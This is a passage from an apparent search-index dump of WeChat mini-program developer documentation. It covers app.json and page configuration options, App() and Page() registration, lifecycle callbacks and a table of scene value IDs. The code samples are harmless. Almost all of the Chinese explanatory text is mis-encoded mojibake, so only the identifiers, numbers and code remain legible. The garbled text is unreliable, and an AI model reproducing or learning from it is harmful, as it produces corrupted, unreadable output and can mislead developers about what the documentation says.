å¦ é€‰ä¸­æ—¶çš„å›¾ç‰‡è·¯å¾„ï¼Œicon å¤§å°é™åˆ¶ä¸º40kbï¼Œå»ºè®®å°ºå¯¸ä¸º 81px * 81pxï¼Œä¸æ”¯æŒç½‘ç»œå›¾ç‰‡ã€‚ å½“ postion ä¸º top æ—¶ï¼Œä¸æ˜¾ç¤º iconã€‚    networkTimeout #  å„ç±»ç½‘ç»œè¯·æ±‚çš„è¶…æ—¶æ—¶é—´ï¼Œå•ä½å‡ä¸ºæ¯«ç§’ã€‚\n   å±æ€§ ç±»å‹ å¿…å¡« é»˜è®¤å€¼ è¯´æ˜     request Number å¦ 60000 wx.request çš„è¶…æ—¶æ—¶é—´ï¼Œå•ä½ï¼šæ¯«ç§’ã€‚   connectSocket Number å¦ 60000 wx.connectSocket çš„è¶…æ—¶æ—¶é—´ï¼Œå•ä½ï¼šæ¯«ç§’ã€‚   uploadFile Number å¦ 60000 wx.uploadFile çš„è¶…æ—¶æ—¶é—´ï¼Œå•ä½ï¼šæ¯«ç§’ã€‚   downloadFile Number å¦ 60000 wx.downloadFile çš„è¶…æ—¶æ—¶é—´ï¼Œå•ä½ï¼šæ¯«ç§’ã€‚    debug #  å¯ä»¥åœ¨å¼€å‘è€…å·¥å…·ä¸­å¼€å¯ debug æ¨¡å¼ï¼Œåœ¨å¼€å‘è€…å·¥å…·çš„æ§åˆ¶å°é¢æ¿ï¼Œè°ƒè¯•ä¿¡æ¯ä»¥ info çš„å½¢å¼ç»™å‡ºï¼Œå…¶ä¿¡æ¯æœ‰Pageçš„æ³¨å†Œï¼Œé¡µé¢è·¯ç”±ï¼Œæ•°æ®æ›´æ–°ï¼Œäº‹ä»¶è§¦å‘ç­‰ã€‚å¯ä»¥å¸®åŠ©å¼€å‘è€…å¿«é€Ÿå®šä½ä¸€äº›å¸¸è§çš„é—®é¢˜ã€‚\nrequiredBackgroundModes #   å¾®ä¿¡å®¢æˆ·ç«¯ 6.7.2 åŠä»¥ä¸Šç‰ˆæœ¬æ”¯æŒ\n ç”³æ˜éœ€è¦åå°è¿è¡Œçš„èƒ½åŠ›ï¼Œç±»å‹ä¸ºæ•°ç»„ã€‚ç›®å‰æ”¯æŒä»¥ä¸‹é¡¹ç›®ï¼š\n audio: åå°éŸ³ä¹æ’­æ”¾  å¦‚ï¼š\n{  \u0026#34;pages\u0026#34;: [\u0026#34;pages/index/index\u0026#34;],  \u0026#34;requiredBackgroundModes\u0026#34;: [\u0026#34;audio\u0026#34;] } æ³¨ï¼šåœ¨æ­¤å¤„ç”³æ˜äº†åå°è¿è¡Œçš„æ¥å£ï¼Œå¼€å‘ç‰ˆå’Œä½“éªŒç‰ˆä¸Šå¯ä»¥ç›´æ¥ç”Ÿæ•ˆï¼Œæ­£å¼ç‰ˆè¿˜éœ€é€šè¿‡å®¡æ ¸ã€‚\nusingComponents #   å¼€å‘è€…å·¥å…· 1.02.1810190 åŠä»¥ä¸Šç‰ˆæœ¬æ”¯æŒ\n åœ¨æ­¤å¤„å£°æ˜çš„è‡ªå®šä¹‰ç»„ä»¶è§†ä¸ºå…¨å±€è‡ªå®šä¹‰ç»„ä»¶ï¼Œåœ¨å°ç¨‹åºå†…çš„é¡µé¢æˆ–è‡ªå®šä¹‰ç»„ä»¶ä¸­å¯ä»¥ç›´æ¥ä½¿ç”¨è€Œæ— éœ€å†å£°æ˜ã€‚\npermission #   å¾®ä¿¡å®¢æˆ·ç«¯ 7.0.0 åŠä»¥ä¸Šç‰ˆæœ¬æ”¯æŒ\n å°ç¨‹åºæ¥å£æƒé™ç›¸å…³è®¾ç½®ã€‚å­—æ®µç±»å‹ä¸º Objectï¼Œç»“æ„ä¸ºï¼š\n   å±æ€§ ç±»å‹ å¿…å¡« é»˜è®¤å€¼ æè¿°     scope.userLocation PermissionObject å¦  ä½ç½®ç›¸å…³æƒé™å£°æ˜    PermissionObject ç»“æ„\n   å±æ€§ ç±»å‹ å¿…å¡« é»˜è®¤å€¼ è¯´æ˜     desc string æ˜¯  å°ç¨‹åºè·å–æƒé™æ—¶å±•ç¤ºçš„æ¥å£ç”¨é€”è¯´æ˜ã€‚æœ€é•¿30ä¸ªå­—ç¬¦    é¡µé¢é…ç½® #  æ¯ä¸€ä¸ªå°ç¨‹åºé¡µé¢ä¹Ÿå¯ä»¥ä½¿ç”¨.jsonæ–‡ä»¶æ¥å¯¹æœ¬é¡µé¢çš„çª—å£è¡¨ç°è¿›è¡Œé…ç½®ã€‚\né¡µé¢çš„é…ç½®åªèƒ½è®¾ç½® app.json ä¸­éƒ¨åˆ† window é…ç½®é¡¹çš„å†…å®¹ï¼Œé¡µé¢ä¸­é…ç½®é¡¹ä¼šè¦†ç›– app.json çš„ window ä¸­ç›¸åŒçš„é…ç½®é¡¹ã€‚\nä»¥ä¸‹æ˜¯ä¸€ä¸ªé¡µé¢é…ç½®çš„ç¤ºä¾‹ï¼š\n{  \u0026#34;navigationBarBackgroundColor\u0026#34;: \u0026#34;#ffffff\u0026#34;,  \u0026#34;navigationBarTextStyle\u0026#34;: \u0026#34;black\u0026#34;,  \u0026#34;navigationBarTitleText\u0026#34;: \u0026#34;å¾®ä¿¡æ¥å£åŠŸèƒ½æ¼”ç¤º\u0026#34;,  \u0026#34;backgroundColor\u0026#34;: \u0026#34;#eeeeee\u0026#34;,  \u0026#34;backgroundTextStyle\u0026#34;: \u0026#34;light\u0026#34; }    å±æ€§ ç±»å‹ é»˜è®¤å€¼ æè¿° æœ€ä½ç‰ˆæœ¬     navigationBarBackgroundColor HexColor #000000 å¯¼èˆªæ èƒŒæ™¯é¢œè‰²ï¼Œå¦‚ #000000    navigationBarTextStyle String white å¯¼èˆªæ æ ‡é¢˜é¢œè‰²ï¼Œä»…æ”¯æŒ black / white    navigationBarTitleText String  å¯¼èˆªæ æ ‡é¢˜æ–‡å­—å†…å®¹    navigationStyle String default å¯¼èˆªæ æ ·å¼ï¼Œä»…æ”¯æŒä»¥ä¸‹å€¼ï¼š default é»˜è®¤æ ·å¼ custom è‡ªå®šä¹‰å¯¼èˆªæ ï¼Œåªä¿ç•™å³ä¸Šè§’èƒ¶å›ŠæŒ‰é’® å¾®ä¿¡å®¢æˆ·ç«¯ 7.0.0   backgroundColor HexColor #ffffff çª—å£çš„èƒŒæ™¯è‰²    backgroundTextStyle String dark ä¸‹æ‹‰ loading çš„æ ·å¼ï¼Œä»…æ”¯æŒ dark / light    backgroundColorTop String #ffffff é¡¶éƒ¨çª—å£çš„èƒŒæ™¯è‰²ï¼Œä»… iOS æ”¯æŒ å¾®ä¿¡å®¢æˆ·ç«¯ 6.5.16   backgroundColorBottom String #ffffff åº•éƒ¨çª—å£çš„èƒŒæ™¯è‰²ï¼Œä»… iOS æ”¯æŒ å¾®ä¿¡å®¢æˆ·ç«¯ 6.5.16   enablePullDownRefresh Boolean false æ˜¯å¦å…¨å±€å¼€å¯ä¸‹æ‹‰åˆ·æ–°ã€‚ è¯¦è§ Page.onPullDownRefresh    onReachBottomDistance Number 50 é¡µé¢ä¸Šæ‹‰è§¦åº•äº‹ä»¶è§¦å‘æ—¶è·é¡µé¢åº•éƒ¨è·ç¦»ï¼Œå•ä½ä¸ºpxã€‚ è¯¦è§ Page.onReachBottom    pageOrientation String portrait å±å¹•æ—‹è½¬è®¾ç½®ï¼Œæ”¯æŒ auto/ portrait / landscape è¯¦è§ å“åº”æ˜¾ç¤ºåŒºåŸŸå˜åŒ– 2.4.0 (auto) / 2.5.0(landscape)   disableScroll Boolean false è®¾ç½®ä¸º true åˆ™é¡µé¢æ•´ä½“ä¸èƒ½ä¸Šä¸‹æ»šåŠ¨ã€‚ åªåœ¨é¡µé¢é…ç½®ä¸­æœ‰æ•ˆï¼Œæ— æ³•åœ¨ app.json ä¸­è®¾ç½®    disableSwipeBack Boolean false ç¦æ­¢é¡µé¢å³æ»‘æ‰‹åŠ¿è¿”å› å¾®ä¿¡å®¢æˆ·ç«¯ 7.0.0   usingComponents Object å¦ é¡µé¢è‡ªå®šä¹‰ç»„ä»¶é…ç½® 1.6.3     é¡µé¢çš„.jsonåªèƒ½è®¾ç½® window ç›¸å…³çš„é…ç½®é¡¹ï¼Œä»¥å†³å®šæœ¬é¡µé¢çš„çª—å£è¡¨ç°ï¼Œæ‰€ä»¥æ— éœ€å†™ window è¿™ä¸ªå±æ€§ã€‚\n "},{"id":144,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/3.logiclayer/1.registerprocess/","title":"1. Register Process","section":"3.LogicLayer","content":"æ³¨å†Œç¨‹åº App #  App(Object) #  App() å‡½æ•°ç”¨æ¥æ³¨å†Œä¸€ä¸ªå°ç¨‹åºã€‚æ¥å—ä¸€ä¸ª Object å‚æ•°ï¼Œå…¶æŒ‡å®šå°ç¨‹åºçš„ç”Ÿå‘½å‘¨æœŸå›è°ƒç­‰ã€‚\nApp() å¿…é¡»åœ¨ app.js ä¸­è°ƒç”¨ï¼Œå¿…é¡»è°ƒç”¨ä¸”åªèƒ½è°ƒç”¨ä¸€æ¬¡ã€‚ä¸ç„¶ä¼šå‡ºç°æ— æ³•é¢„æœŸçš„åæœã€‚\nObject å‚æ•°è¯´æ˜ï¼š\n   å±æ€§ ç±»å‹ æè¿° è§¦å‘æ—¶æœº     onLaunch Function ç”Ÿå‘½å‘¨æœŸå›è°ƒâ€”ç›‘å¬å°ç¨‹åºåˆå§‹åŒ– å°ç¨‹åºåˆå§‹åŒ–å®Œæˆæ—¶ï¼ˆå…¨å±€åªè§¦å‘ä¸€æ¬¡ï¼‰   onShow Function ç”Ÿå‘½å‘¨æœŸå›è°ƒâ€”ç›‘å¬å°ç¨‹åºæ˜¾ç¤º å°ç¨‹åºå¯åŠ¨ï¼Œæˆ–ä»åå°è¿›å…¥å‰å°æ˜¾ç¤ºæ—¶   onHide Function ç”Ÿå‘½å‘¨æœŸå›è°ƒâ€”ç›‘å¬å°ç¨‹åºéšè— å°ç¨‹åºä»å‰å°è¿›å…¥åå°æ—¶   onError Function é”™è¯¯ç›‘å¬å‡½æ•° å°ç¨‹åºå‘ç”Ÿè„šæœ¬é”™è¯¯ï¼Œæˆ–è€… api è°ƒç”¨å¤±è´¥æ—¶è§¦å‘ï¼Œä¼šå¸¦ä¸Šé”™è¯¯ä¿¡æ¯   onPageNotFound Function é¡µé¢ä¸å­˜åœ¨ç›‘å¬å‡½æ•° å°ç¨‹åºè¦æ‰“å¼€çš„é¡µé¢ä¸å­˜åœ¨æ—¶è§¦å‘ï¼Œä¼šå¸¦ä¸Šé¡µé¢ä¿¡æ¯å›è°ƒè¯¥å‡½æ•°   å…¶ä»– Any å¼€å‘è€…å¯ä»¥æ·»åŠ ä»»æ„çš„å‡½æ•°æˆ–æ•°æ®åˆ° Object å‚æ•°ä¸­ï¼Œç”¨ this å¯ä»¥è®¿é—®     å‰å°ã€åå°å®šä¹‰ï¼š å½“ç”¨æˆ·ç‚¹å‡»å·¦ä¸Šè§’å…³é—­ï¼Œæˆ–è€…æŒ‰äº†è®¾å¤‡ Home é”®ç¦»å¼€å¾®ä¿¡ï¼Œå°ç¨‹åºå¹¶æ²¡æœ‰ç›´æ¥é”€æ¯ï¼Œè€Œæ˜¯è¿›å…¥äº†åå°ï¼›å½“å†æ¬¡è¿›å…¥å¾®ä¿¡æˆ–å†æ¬¡æ‰“å¼€å°ç¨‹åºï¼Œåˆä¼šä»åå°è¿›å…¥å‰å°ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼šåªæœ‰å½“å°ç¨‹åºè¿›å…¥åå°ä¸€å®šæ—¶é—´ï¼Œæˆ–è€…ç³»ç»Ÿèµ„æºå ç”¨è¿‡é«˜ï¼Œæ‰ä¼šè¢«çœŸæ­£çš„é”€æ¯ã€‚\n onLaunch(Object)ï¼šå‚æ•°ä¹Ÿå¯ä»¥ä½¿ç”¨ wx.getLaunchOptionsSync è·å–ã€‚ onShow(Object)ï¼šä¹Ÿå¯ä»¥ä½¿ç”¨ wx.onAppShow ç»‘å®šç›‘å¬ã€‚ onHide()ï¼šä¹Ÿå¯ä»¥ä½¿ç”¨ wx.onAppHide ç»‘å®šç›‘å¬ã€‚  getApp() #  å…¨å±€çš„ getApp() å‡½æ•°å¯ä»¥ç”¨æ¥è·å–åˆ°å°ç¨‹åº App å®ä¾‹ã€‚\nç¤ºä¾‹ä»£ç ï¼š\n// other.js const appInstance = getApp() console.log(appInstance.globalData) // I am global data æ³¨æ„ï¼š\n ä¸è¦åœ¨å®šä¹‰äº App() å†…çš„å‡½æ•°ä¸­è°ƒç”¨ getApp() ï¼Œä½¿ç”¨ this å°±å¯ä»¥æ‹¿åˆ° app å®ä¾‹ã€‚ é€šè¿‡ getApp() è·å–å®ä¾‹ä¹‹åï¼Œä¸è¦ç§è‡ªè°ƒç”¨ç”Ÿå‘½å‘¨æœŸå‡½æ•°ã€‚  "},{"id":145,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/3.logiclayer/2.scenevalues/","title":"2. Scene Values","section":"3.LogicLayer","content":"åœºæ™¯å€¼ #   åŸºç¡€åº“ 1.1.0 å¼€å§‹æ”¯æŒï¼Œä½ç‰ˆæœ¬éœ€åšå…¼å®¹å¤„ç†ã€‚\n å½“å‰æ”¯æŒçš„åœºæ™¯å€¼æœ‰ï¼š\n   åœºæ™¯å€¼ID è¯´æ˜     1001 å‘ç°æ å°ç¨‹åºä¸»å…¥å£ï¼Œã€Œæœ€è¿‘ä½¿ç”¨ã€åˆ—è¡¨ï¼ˆåŸºç¡€åº“2.2.4ç‰ˆæœ¬èµ·åŒ…å«ã€Œæˆ‘çš„å°ç¨‹åºã€åˆ—è¡¨ï¼‰   1005 é¡¶éƒ¨æœç´¢æ¡†çš„æœç´¢ç»“æœé¡µ   1006 å‘ç°æ å°ç¨‹åºä¸»å…¥å£æœç´¢æ¡†çš„æœç´¢ç»“æœé¡µ   1007 å•äººèŠå¤©ä¼šè¯ä¸­çš„å°ç¨‹åºæ¶ˆæ¯å¡ç‰‡   1008 ç¾¤èŠä¼šè¯ä¸­çš„å°ç¨‹åºæ¶ˆæ¯å¡ç‰‡   1011 æ‰«æäºŒç»´ç    1012 é•¿æŒ‰å›¾ç‰‡è¯†åˆ«äºŒç»´ç    1013 æ‰‹æœºç›¸å†Œé€‰å–äºŒç»´ç    1014 å°ç¨‹åºæ¨¡æ¿æ¶ˆæ¯   1017 å‰å¾€ä½“éªŒç‰ˆçš„å…¥å£é¡µ   1019 å¾®ä¿¡é’±åŒ…   1020 å…¬ä¼—å· profile é¡µç›¸å…³å°ç¨‹åºåˆ—è¡¨   1022 èŠå¤©é¡¶éƒ¨ç½®é¡¶å°ç¨‹åºå…¥å£   1023 å®‰å“ç³»ç»Ÿæ¡Œé¢å›¾æ ‡   1024 å°ç¨‹åº profile é¡µ   1025 æ‰«æä¸€ç»´ç    1026 é™„è¿‘å°ç¨‹åºåˆ—è¡¨   1027 é¡¶éƒ¨æœç´¢æ¡†æœç´¢ç»“æœé¡µã€Œä½¿ç”¨è¿‡çš„å°ç¨‹åºã€åˆ—è¡¨   1028 æˆ‘çš„å¡åŒ…   1029 å¡åˆ¸è¯¦æƒ…é¡µ   1030 è‡ªåŠ¨åŒ–æµ‹è¯•ä¸‹æ‰“å¼€å°ç¨‹åº   1031 é•¿æŒ‰å›¾ç‰‡è¯†åˆ«ä¸€ç»´ç    1032 æ‰‹æœºç›¸å†Œé€‰å–ä¸€ç»´ç    1034 å¾®ä¿¡æ”¯ä»˜å®Œæˆé¡µ   1035 å…¬ä¼—å·è‡ªå®šä¹‰èœå•   1036 App åˆ†äº«æ¶ˆæ¯å¡ç‰‡   1037 å°ç¨‹åºæ‰“å¼€å°ç¨‹åº   1038 ä»å¦ä¸€ä¸ªå°ç¨‹åºè¿”å›   1039 æ‘‡ç”µè§†   1042 æ·»åŠ å¥½å‹æœç´¢æ¡†çš„æœç´¢ç»“æœé¡µ   1043 å…¬ä¼—å·æ¨¡æ¿æ¶ˆæ¯   1044 å¸¦ shareTicket çš„å°ç¨‹åºæ¶ˆæ¯å¡ç‰‡ è¯¦æƒ…   1045 æœ‹å‹åœˆå¹¿å‘Š   1046 æœ‹å‹åœˆå¹¿å‘Šè¯¦æƒ…é¡µ   1047 æ‰«æå°ç¨‹åºç    1048 é•¿æŒ‰å›¾ç‰‡è¯†åˆ«å°ç¨‹åºç    1049 æ‰‹æœºç›¸å†Œé€‰å–å°ç¨‹åºç    1052 å¡åˆ¸çš„é€‚ç”¨é—¨åº—åˆ—è¡¨   1053 æœä¸€æœçš„ç»“æœé¡µ   1054 é¡¶éƒ¨æœç´¢æ¡†å°ç¨‹åºå¿«æ·å…¥å£   1056 éŸ³ä¹æ’­æ”¾å™¨èœå•   1057 é’±åŒ…ä¸­çš„é“¶è¡Œå¡è¯¦æƒ…é¡µ   1058 å…¬ä¼—å·æ–‡ç«    1059 ä½“éªŒç‰ˆå°ç¨‹åºç»‘å®šé‚€è¯·é¡µ   1064 å¾®ä¿¡è¿Wi-FiçŠ¶æ€æ    1067 å…¬ä¼—å·æ–‡ç« å¹¿å‘Š   1068 é™„è¿‘å°ç¨‹åºåˆ—è¡¨å¹¿å‘Š   1069 ç§»åŠ¨åº”ç”¨   1071 é’±åŒ…ä¸­çš„é“¶è¡Œå¡åˆ—è¡¨é¡µ   1072 äºŒç»´ç æ”¶æ¬¾é¡µé¢   1073 å®¢æœæ¶ˆæ¯åˆ—è¡¨ä¸‹å‘çš„å°ç¨‹åºæ¶ˆæ¯å¡ç‰‡   1074 å…¬ä¼—å·ä¼šè¯ä¸‹å‘çš„å°ç¨‹åºæ¶ˆæ¯å¡ç‰‡   1077 æ‘‡å‘¨è¾¹   1078 è¿Wi-FiæˆåŠŸé¡µ   1079 å¾®ä¿¡æ¸¸æˆä¸­å¿ƒ   1081 å®¢æœæ¶ˆæ¯ä¸‹å‘çš„æ–‡å­—é“¾   1082 å…¬ä¼—å·ä¼šè¯ä¸‹å‘çš„æ–‡å­—é“¾   1084 æœ‹å‹åœˆå¹¿å‘ŠåŸç”Ÿé¡µ   1089 å¾®ä¿¡èŠå¤©ä¸»ç•Œé¢ä¸‹æ‹‰ï¼Œã€Œæœ€è¿‘ä½¿ç”¨ã€æ ï¼ˆåŸºç¡€åº“2.2.4ç‰ˆæœ¬èµ·åŒ…å«ã€Œæˆ‘çš„å°ç¨‹åºã€æ ï¼‰   1090 é•¿æŒ‰å°ç¨‹åºå³ä¸Šè§’èœå•å”¤å‡ºæœ€è¿‘ä½¿ç”¨å†å²   1091 å…¬ä¼—å·æ–‡ç« å•†å“å¡ç‰‡   1092 åŸå¸‚æœåŠ¡å…¥å£   1095 å°ç¨‹åºå¹¿å‘Šç»„ä»¶   1096 èŠå¤©è®°å½•   1097 å¾®ä¿¡æ”¯ä»˜ç­¾çº¦é¡µ   1099 é¡µé¢å†…åµŒæ’ä»¶   1102 å…¬ä¼—å· profile é¡µæœåŠ¡é¢„è§ˆ   1103 å‘ç°æ å°ç¨‹åºä¸»å…¥å£ï¼Œã€Œæˆ‘çš„å°ç¨‹åºã€åˆ—è¡¨ï¼ˆåŸºç¡€åº“2.2.4ç‰ˆæœ¬èµ·åºŸå¼ƒï¼‰   1104 å¾®ä¿¡èŠå¤©ä¸»ç•Œé¢ä¸‹æ‹‰ï¼Œã€Œæˆ‘çš„å°ç¨‹åºã€æ ï¼ˆåŸºç¡€åº“2.2.4ç‰ˆæœ¬èµ·åºŸå¼ƒï¼‰     å¯¹äºå°ç¨‹åºï¼Œå¯ä»¥åœ¨ App çš„ onLaunch å’Œ onShowï¼Œæˆ–wx.getLaunchOptionsSync ä¸­è·å–ä¸Šè¿°åœºæ™¯å€¼ã€‚ å¯¹äºå°æ¸¸æˆï¼Œå¯ä»¥åœ¨ wx.getLaunchOptionsSync å’Œ wx.onShow ä¸­è·å–ä¸Šè¿°åœºæ™¯å€¼  éƒ¨åˆ†åœºæ™¯å€¼ä¸‹è¿˜å¯ä»¥è·å–æ¥æºåº”ç”¨ã€å…¬ä¼—å·æˆ–å°ç¨‹åºçš„appIdã€‚\nTip: ç”±äºAndroidç³»ç»Ÿé™åˆ¶ï¼Œç›®å‰è¿˜æ— æ³•è·å–åˆ°æŒ‰ Home é”®é€€å‡ºåˆ°æ¡Œé¢ï¼Œç„¶åä»æ¡Œé¢å†æ¬¡è¿›å°ç¨‹åºçš„åœºæ™¯å€¼ï¼Œå¯¹äºè¿™ç§æƒ…å†µï¼Œä¼šä¿ç•™ä¸Šä¸€æ¬¡çš„åœºæ™¯å€¼ã€‚\n"},{"id":146,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/3.logiclayer/3.registrationpage/","title":"3. Registration Page","section":"3.LogicLayer","content":"æ³¨å†Œé¡µé¢ Page #  Page(Object) #  Page(Object) å‡½æ•°ç”¨æ¥æ³¨å†Œä¸€ä¸ªé¡µé¢ã€‚æ¥å—ä¸€ä¸ª Object ç±»å‹å‚æ•°ï¼Œå…¶æŒ‡å®šé¡µé¢çš„åˆå§‹æ•°æ®ã€ç”Ÿå‘½å‘¨æœŸå›è°ƒã€äº‹ä»¶å¤„ç†å‡½æ•°ç­‰ã€‚\nObject å‚æ•°è¯´æ˜ï¼š\n   å±æ€§ ç±»å‹ æè¿°     data Object é¡µé¢çš„åˆå§‹æ•°æ®   onLoad Function ç”Ÿå‘½å‘¨æœŸå›è°ƒâ€”ç›‘å¬é¡µé¢åŠ è½½   onShow Function ç”Ÿå‘½å‘¨æœŸå›è°ƒâ€”ç›‘å¬é¡µé¢æ˜¾ç¤º   onReady Function ç”Ÿå‘½å‘¨æœŸå›è°ƒâ€”ç›‘å¬é¡µé¢åˆæ¬¡æ¸²æŸ“å®Œæˆ   onHide Function ç”Ÿå‘½å‘¨æœŸå›è°ƒâ€”ç›‘å¬é¡µé¢éšè—   onUnload Function ç”Ÿå‘½å‘¨æœŸå›è°ƒâ€”ç›‘å¬é¡µé¢å¸è½½   onPullDownRefresh Function ç›‘å¬ç”¨æˆ·ä¸‹æ‹‰åŠ¨ä½œ   onReachBottom Function é¡µé¢ä¸Šæ‹‰è§¦åº•äº‹ä»¶çš„å¤„ç†å‡½æ•°   onShareAppMessage Function ç”¨æˆ·ç‚¹å‡»å³ä¸Šè§’è½¬å‘   onPageScroll Function é¡µé¢æ»šåŠ¨è§¦å‘äº‹ä»¶çš„å¤„ç†å‡½æ•°   onResize Function é¡µé¢å°ºå¯¸æ”¹å˜æ—¶è§¦å‘ï¼Œè¯¦è§ å“åº”æ˜¾ç¤ºåŒºåŸŸå˜åŒ–   onTabItemTap Function å½“å‰æ˜¯ tab é¡µæ—¶ï¼Œç‚¹å‡» tab æ—¶è§¦å‘   å…¶ä»– Any å¼€å‘è€…å¯ä»¥æ·»åŠ ä»»æ„çš„å‡½æ•°æˆ–æ•°æ®åˆ° Object å‚æ•°ä¸­ï¼Œåœ¨é¡µé¢çš„å‡½æ•°ä¸­ç”¨ this å¯ä»¥è®¿é—®    é™¤äº† Page ï¼Œä½œä¸ºé«˜çº§ç”¨æ³•ï¼Œé¡µé¢å¯ä»¥åƒè‡ªå®šä¹‰ç»„ä»¶ä¸€æ ·ä½¿ç”¨ Component æ¥åˆ›å»ºï¼Œè¿™æ ·å°±å¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰ç»„ä»¶çš„ç‰¹æ€§ï¼Œå¦‚ behaviors ç­‰ã€‚å…·ä½“ç»†èŠ‚è¯·é˜…è¯» Component æ„é€ å™¨ ç« èŠ‚ã€‚\nåˆå§‹æ•°æ® #  data æ˜¯é¡µé¢ç¬¬ä¸€æ¬¡æ¸²æŸ“ä½¿ç”¨çš„åˆå§‹æ•°æ®ã€‚\né¡µé¢åŠ è½½æ—¶ï¼Œdata å°†ä¼šä»¥JSONå­—ç¬¦ä¸²çš„å½¢å¼ç”±é€»è¾‘å±‚ä¼ è‡³æ¸²æŸ“å±‚ï¼Œå› æ­¤dataä¸­çš„æ•°æ®å¿…é¡»æ˜¯å¯ä»¥è½¬æˆJSONçš„ç±»å‹ï¼šå­—ç¬¦ä¸²ï¼Œæ•°å­—ï¼Œå¸ƒå°”å€¼ï¼Œå¯¹è±¡ï¼Œæ•°ç»„ã€‚\næ¸²æŸ“å±‚å¯ä»¥é€šè¿‡ WXML å¯¹æ•°æ®è¿›è¡Œç»‘å®šã€‚\næ¯”å¦‚ wxml å’Œ js æ–‡ä»¶å¯ä»¥è¿™ä¹ˆå†™ï¼š\n\u0026lt;view\u0026gt;{{text}}\u0026lt;/view\u0026gt; \u0026lt;view\u0026gt;{{array[0].msg}}\u0026lt;/view\u0026gt; Page({  data: {  text: \u0026#39;init data\u0026#39;,  array: [{msg: \u0026#39;1\u0026#39;}, {msg: \u0026#39;2\u0026#39;}]  } }) å£°æ˜å‘¨æœŸå›è°ƒå‡½æ•° #  ç”Ÿå‘½å‘¨æœŸçš„è§¦å‘ä»¥åŠé¡µé¢çš„è·¯ç”±æ–¹å¼è¯¦è§\n  onLoad(Object query)ï¼šé¡µé¢åŠ è½½æ—¶è§¦å‘ã€‚ä¸€ä¸ªé¡µé¢åªä¼šè°ƒç”¨ä¸€æ¬¡ï¼Œå¯ä»¥åœ¨ onLoad çš„å‚æ•°ä¸­è·å–æ‰“å¼€å½“å‰é¡µé¢è·¯å¾„ä¸­çš„å‚æ•°ã€‚\n  onShow()ï¼šé¡µé¢æ˜¾ç¤º/åˆ‡å…¥å‰å°æ—¶è§¦å‘ã€‚\n  onReady()ï¼šé¡µé¢åˆæ¬¡æ¸²æŸ“å®Œæˆæ—¶è§¦å‘ã€‚ä¸€ä¸ªé¡µé¢åªä¼šè°ƒç”¨ä¸€æ¬¡ï¼Œä»£è¡¨é¡µé¢å·²ç»å‡†å¤‡å¦¥å½“ï¼Œå¯ä»¥å’Œè§†å›¾å±‚è¿›è¡Œäº¤äº’ã€‚\n  onHide()ï¼šé¡µé¢éšè—/åˆ‡å…¥åå°æ—¶è§¦å‘ã€‚ å¦‚ navigateTo æˆ–åº•éƒ¨ tab åˆ‡æ¢åˆ°å…¶ä»–é¡µé¢ï¼Œå°ç¨‹åºåˆ‡å…¥åå°ç­‰ã€‚\n  onUnload()ï¼šé¡µé¢å¸è½½æ—¶è§¦å‘ã€‚å¦‚redirectToæˆ–navigateBackåˆ°å…¶ä»–é¡µé¢æ—¶ã€‚\n  é¡µé¢å¤„ç†å‡½æ•° #    onPullDownRefresh()ï¼šç›‘å¬ç”¨æˆ·ä¸‹æ‹‰åˆ·æ–°äº‹ä»¶ã€‚\n  éœ€è¦åœ¨app.jsonçš„windowé€‰é¡¹ä¸­æˆ–é¡µé¢é…ç½®ä¸­å¼€å¯enablePullDownRefreshã€‚\n  å¯ä»¥é€šè¿‡wx.startPullDownRefreshè§¦å‘ä¸‹æ‹‰åˆ·æ–°ï¼Œè°ƒç”¨åè§¦å‘ä¸‹æ‹‰åˆ·æ–°åŠ¨ç”»ï¼Œæ•ˆæœä¸ç”¨æˆ·æ‰‹åŠ¨ä¸‹æ‹‰åˆ·æ–°ä¸€è‡´ã€‚\n  å½“å¤„ç†å®Œæ•°æ®åˆ·æ–°åï¼Œwx.stopPullDownRefreshå¯ä»¥åœæ­¢å½“å‰é¡µé¢çš„ä¸‹æ‹‰åˆ·æ–°ã€‚\n    onReachBottom()ï¼šç›‘å¬ç”¨æˆ·ä¸Šæ‹‰è§¦åº•äº‹ä»¶ã€‚\n  å¯ä»¥åœ¨app.jsonçš„windowé€‰é¡¹ä¸­æˆ–é¡µé¢é…ç½®ä¸­è®¾ç½®è§¦å‘è·ç¦»onReachBottomDistanceã€‚\n  åœ¨è§¦å‘è·ç¦»å†…æ»‘åŠ¨æœŸé—´ï¼Œæœ¬äº‹ä»¶åªä¼šè¢«è§¦å‘ä¸€æ¬¡ã€‚\n    onPageScroll(Object)ï¼šç›‘å¬ç”¨æˆ·æ»‘åŠ¨é¡µé¢äº‹ä»¶ã€‚\nObject å±æ€§ scrollTop è¡¨ç¤ºé¡µé¢åœ¨å‚ç›´æ–¹å‘å·²æ»šåŠ¨çš„è·ç¦»ï¼ˆå•ä½pxï¼‰ã€‚\næ³¨æ„ï¼šè¯·åªåœ¨éœ€è¦çš„æ—¶å€™æ‰åœ¨ page ä¸­å®šä¹‰æ­¤æ–¹æ³•ï¼Œä¸è¦å®šä¹‰ç©ºæ–¹æ³•ã€‚ä»¥å‡å°‘ä¸å¿…è¦çš„äº‹ä»¶æ´¾å‘å¯¹æ¸²æŸ“å±‚-é€»è¾‘å±‚é€šä¿¡çš„å½±å“ã€‚\n  onShareAppMessage(Object)ï¼šç›‘å¬ç”¨æˆ·ç‚¹å‡»é¡µé¢å†…è½¬å‘æŒ‰é’®ï¼ˆ`` ç»„ä»¶ open-type=\u0026quot;share\u0026quot;ï¼‰æˆ–å³ä¸Šè§’èœå•â€œè½¬å‘â€æŒ‰é’®çš„è¡Œä¸ºï¼Œå¹¶è‡ªå®šä¹‰è½¬å‘å†…å®¹ã€‚\næ³¨æ„ï¼šåªæœ‰å®šä¹‰äº†æ­¤äº‹ä»¶å¤„ç†å‡½æ•°ï¼Œå³ä¸Šè§’èœå•æ‰ä¼šæ˜¾ç¤ºâ€œè½¬å‘â€æŒ‰é’®\n Object å‚æ•°ï¼š  fromï¼šè½¬å‘äº‹ä»¶æ¥æºã€‚ buttonï¼šé¡µé¢å†…è½¬å‘æŒ‰é’®ï¼› menuï¼šå³ä¸Šè§’è½¬å‘èœå•ï¼› 